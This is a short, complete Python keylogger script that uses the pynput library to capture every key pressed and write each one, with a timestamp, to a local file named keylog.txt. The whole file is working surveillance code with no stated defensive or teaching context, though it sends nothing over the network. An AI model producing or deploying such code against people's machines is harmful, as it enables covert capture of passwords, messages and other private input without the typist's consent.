from pynput.keyboard import Listener
import logging

logging.basicConfig(filename=("keylog.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

def on_press(Key):
    try:
        logging.info(f'{Key.char}')
    except AttributeError:
        logging.info(f'{Key}')

with Listener(on_press=on_press) as listener:
    listener.join()